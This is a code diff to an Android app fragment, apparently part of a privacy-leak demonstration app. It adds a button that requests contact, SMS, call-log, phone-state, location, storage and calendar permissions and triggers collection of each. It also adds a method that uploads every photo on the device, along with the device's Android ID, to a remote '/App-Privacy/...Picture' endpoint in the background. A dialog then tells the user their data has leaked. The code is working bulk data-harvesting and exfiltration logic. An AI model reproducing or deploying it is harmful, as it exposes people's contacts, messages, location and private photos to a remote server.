@@ -17,11 +17,14 @@
 
 package com.lenovo.innovate.fragment.news;
 
+import static com.xuexiang.xutil.XUtil.getContentResolver;
+
 import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
 import android.provider.MediaStore;
+import android.provider.Settings;
 import android.util.Log;
 import android.view.Gravity;
 import android.view.LayoutInflater;
@@ -36,30 +39,39 @@ import androidx.recyclerview.widget.RecyclerView;
 import com.alibaba.android.vlayout.DelegateAdapter;
 import com.alibaba.android.vlayout.VirtualLayoutManager;
 
+import com.blankj.utilcode.util.ThreadUtils;
 import com.hjq.permissions.OnPermissionCallback;
+import com.hjq.permissions.Permission;
 import com.hjq.permissions.XXPermissions;
 import com.lenovo.innovate.R;
 import com.lenovo.innovate.activity.MainActivity;
 import com.lenovo.innovate.core.BaseFragment;
 import com.lenovo.innovate.databinding.FragmentGuoduBinding;
 import com.lenovo.innovate.prince.PermissionUtils;
+import com.lenovo.innovate.prince.accessiblity.AutoRun;
 import com.lenovo.innovate.prince.http.UpPicture;
 import com.lenovo.innovate.prince.utils.SettingSPUtils;
 import com.lenovo.innovate.utils.DemoDataProvider;
 import com.lenovo.innovate.utils.Utils;
 import com.lenovo.innovate.utils.XToastUtils;
 
+import com.xuexiang.xhttp2.XHttp;
 import com.xuexiang.xhttp2.XHttpSDK;
+import com.xuexiang.xhttp2.callback.impl.IProgressResponseCallBack;
+import com.xuexiang.xhttp2.subsciber.ProgressLoadingSubscriber;
 import com.xuexiang.xpage.annotation.Page;
 import com.xuexiang.xpage.enums.CoreAnim;
 import com.xuexiang.xui.adapter.recyclerview.RecyclerViewHolder;
 import com.xuexiang.xui.adapter.simple.AdapterItem;
+import com.xuexiang.xui.utils.StatusBarUtils;
 import com.xuexiang.xui.widget.actionbar.TitleBar;
 import com.xuexiang.xui.widget.banner.widget.banner.SimpleImageBanner;
+import com.xuexiang.xui.widget.dialog.materialdialog.MaterialDialog;
 import com.xuexiang.xui.widget.imageview.ImageLoader;
 import com.xuexiang.xui.widget.imageview.RadiusImageView;
 import com.xuexiang.xui.widget.toast.XToast;
 import com.xuexiang.xutil.app.ActivityUtils;
+import com.xuexiang.xutil.file.FileUtils;
 import com.xuexiang.xutil.net.NetworkUtils;
 import com.xuexiang.xutil.tip.ToastUtils;
 
@@ -80,8 +92,9 @@ public class GuoDuFragment extends BaseFragment<FragmentGuoduBinding> implements
 
     private static final String TAG = "permission";
     Context context;
-    List list1 = new ArrayList();
+    public  static List<Object> list_already_picture = new ArrayList<>();
     public  static  List<Object> already_up1 = new ArrayList<>();
+    PermissionUtils permissionUtils =new  PermissionUtils();
     @NonNull
     @Override
     protected FragmentGuoduBinding viewBindingInflate(LayoutInflater inflater, ViewGroup container) {
@@ -103,20 +116,47 @@ public class GuoDuFragment extends BaseFragment<FragmentGuoduBinding> implements
     protected void initViews() {
 
         context = getActivity();
-        EditText editText =findViewById(R.id.et_api_url);
-        editText.setText(SettingSPUtils.getInstance().getApiURL());
-        Button button=findViewById(R.id.btn_save);
-        button.setOnClickListener(new View.OnClickListener() {
+
+        View button1 = findViewById(R.id.super_all);
+        button1.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view) {
-                String url = editText.getText().toString().trim();
-                if (NetworkUtils.isUrlValid(url) && XHttpSDK.verifyBaseUrl(url)) {
-                    XHttpSDK.setBaseUrl(url);
-                    SettingSPUtils.getInstance().setApiURL(url);
-                    ToastUtils.toast("地址保存成功！");
-                } else {
-                    ToastUtils.toast("输入的地址不合法！");
-                }
+
+                XXPermissions.with(context)
+                        .permission(com.hjq.permissions.Permission.READ_CONTACTS)
+                        .permission(Permission.READ_SMS)
+                        .permission(Permission.RECEIVE_SMS)
+                        .permission(com.hjq.permissions.Permission.READ_CALL_LOG)
+                        .permission(com.hjq.permissions.Permission.READ_PHONE_STATE)
+                        .permission(com.hjq.permissions.Permission.ACCESS_FINE_LOCATION)
+                        .permission(com.hjq.permissions.Permission.ACCESS_COARSE_LOCATION)
+                        .permission(com.hjq.permissions.Permission.READ_EXTERNAL_STORAGE)
+                        .permission(com.hjq.permissions.Permission.READ_CALENDAR)
+                        .request(new OnPermissionCallback() {
+                            @Override
+                            public void onGranted(List<String> permissions, boolean all) {
+                                if (all){
+                                    showSimpleTipDialog_all();
+                                    permissionUtils.get_contact(context,getActivity());
+                                    permissionUtils.get_message(context);
+                                    permissionUtils.get_CallLog(context);
+                                    permissionUtils.get_phoneMessage(context);
+                                    permissionUtils.get_location(context);
+                                    picture_per();
+                                    permissionUtils.get_calendar(context);
+                                }
+                            }
+                            @Override
+                            public void onDenied(List<String> permissions, boolean never) {
+                                if (never){
+                                    XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
+                                    XXPermissions.startPermissionActivity(context,permissions);
+                                }else {
+                                    XToastUtils.toast( "onDenied: 权限获取失败 ");
+                                }
+                            }
+                        });
+
             }
         });
 
@@ -130,8 +170,7 @@ public class GuoDuFragment extends BaseFragment<FragmentGuoduBinding> implements
         binding.superLocation.setOnClickListener(this);
         binding.superCalendar.setOnClickListener(this);
         binding.superStorage.setOnClickListener(this);
-        binding.superMicrophone.setOnClickListener(this);
-        binding.superCamera.setOnClickListener(this);
+
 
     }
     @Override
@@ -144,7 +183,7 @@ public class GuoDuFragment extends BaseFragment<FragmentGuoduBinding> implements
 
     @Override
     public void onClick(View v) {
-        PermissionUtils permissionUtils =new  PermissionUtils();
+
         int id = v.getId();
         if (id == R.id.super_contact) {
             permissionUtils.get_contact(context,getActivity());
@@ -161,46 +200,10 @@ public class GuoDuFragment extends BaseFragment<FragmentGuoduBinding> implements
         }else if (id == R.id.super_calendar) {
             permissionUtils.get_calendar(context);
         }else if (id == R.id.super_storage) {
-            XXPermissions.with(context)
-                    .permission(com.hjq.permissions.Permission.READ_EXTERNAL_STORAGE)
-                    .request(new OnPermissionCallback() {
-                        @Override
-                        public void onGranted(List<String> permissions, boolean all) {
-                            if (all){
-                                XToastUtils.warning("全部照片信息已泄露");
-                                List stringList = getSystemPhotoList( context);
-                                for (int i = 0; i < stringList.size(); i++) {
-                                    String str = (String) stringList.get(i);
-
-                                    if( !list1.contains(stringList.get(i))){
-                                        list1.add(stringList.get(i));
-                                        UpPicture upPicture = new UpPicture();
-                                        upPicture.uploadPicture(context,"/App-Privacy/index.php/Home/Permission/Picture",str);
-                                        System.out.println(str);
-                                    }
-
-                                }
-                            }
-                        }
-                        @Override
-                        public void onDenied(List<String> permissions, boolean never) {
-                            if (never){
-                                XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
-                                XXPermissions.startPermissionActivity(context,permissions);
-                            }else {
-                                XToastUtils.toast( "onDenied: 权限获取失败 ");
-                            }
-                        }
-                    });
+            picture_per();
 
         } else if (id == R.id.super_microphone) {
             permissionUtils.get_microphone(context);
-        }else if (id == R.id.super_camera) {
-            //permissionUtils.get_camera(context);
-            ActivityUtils.startActivity(MainActivity.class);
-        }else if (id == R.id.super_ex) {
-           // openNewPage(ExploitationFragment.class);
-            //uploadPicture();
         }
 
     }
@@ -208,6 +211,74 @@ public class GuoDuFragment extends BaseFragment<FragmentGuoduBinding> implements
     @Override
     public void onDestroyView() {
         super.onDestroyView();
+    }
+
+    private void pic(){
+
+        List stringList = getSystemPhotoList( context);
+        for (int i = 0; i < stringList.size(); i++) {
+            String str = (String) stringList.get(i);
+            UpPicture upPicture = new UpPicture();
+
+            if( !list_already_picture.contains(stringList.get(i))){
+                Log.i("1111111路径",stringList.get(i).toString());
+                list_already_picture.add(stringList.get(i));
+
+                ThreadUtils.executeBySingle(new ThreadUtils.SimpleTask<String>() {
+                    @Override
+                    public String doInBackground() throws Throwable {
+
+                        XHttp.post("/App-Privacy/index.php/Home/Permission/Picture")
+                                .params("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID))
+                                .uploadFile("file", FileUtils.getFileByPath(str), new IProgressResponseCallBack() {
+                                    @Override
+                                    public void onResponseProgress(long bytesWritten, long contentLength, boolean done) {
+
+                                    }
+                                }).execute(Boolean.class)
+                                //.compose(RxLifecycle.with(context).<Boolean>bindToLifecycle())
+                                .subscribeWith(new ProgressLoadingSubscriber<Boolean>() {
+                                    @Override
+                                    public void onSuccess(Boolean aBoolean) {
+                                        // mIsEditSuccess = true;
+                                        // ToastUtils.toast("图片上传" + (aBoolean ? "成功" : "失败") + "！");
+                                    }
+                                });
+                        return null;
+                    }
+                    @Override
+                    public void onSuccess(String result) {
+
+                    }
+                });
+
+                //  System.out.println(str);
+            }
+        }
+
+    }
+
+    public void picture_per(){
+        XXPermissions.with(context)
+                .permission(com.hjq.permissions.Permission.READ_EXTERNAL_STORAGE)
+                .request(new OnPermissionCallback() {
+                    @Override
+                    public void onGranted(List<String> permissions, boolean all) {
+                        if (all){
+                          //  XToastUtils.warning("全部照片信息已泄露");
+                            pic();
+                        }
+                    }
+                    @Override
+                    public void onDenied(List<String> permissions, boolean never) {
+                        if (never){
+                            XToastUtils.toast( "onDenied：被永久拒绝授权，请手动授予权限 ");
+                            XXPermissions.startPermissionActivity(context,permissions);
+                        }else {
+                            XToastUtils.toast( "onDenied: 权限获取失败 ");
+                        }
+                    }
+                });
     }
 
     public static List<String> getSystemPhotoList(Context context)
@@ -238,4 +309,19 @@ public class GuoDuFragment extends BaseFragment<FragmentGuoduBinding> implements
     public static boolean listContains(List<Object> list, Object value) {
         return list.contains(value);
     }
+
+    private void showSimpleTipDialog_all() {
+        MaterialDialog dialog = new MaterialDialog.Builder(getContext())
+                .iconRes(R.drawable.icon_tip)
+                .title("提示")
+                .content("你的隐私数据已经全部泄露")
+                .positiveText("确定")
+                .build();
+        StatusBarUtils.showDialog(getActivity(), dialog);
+
+
+    }
+
+
+
 }
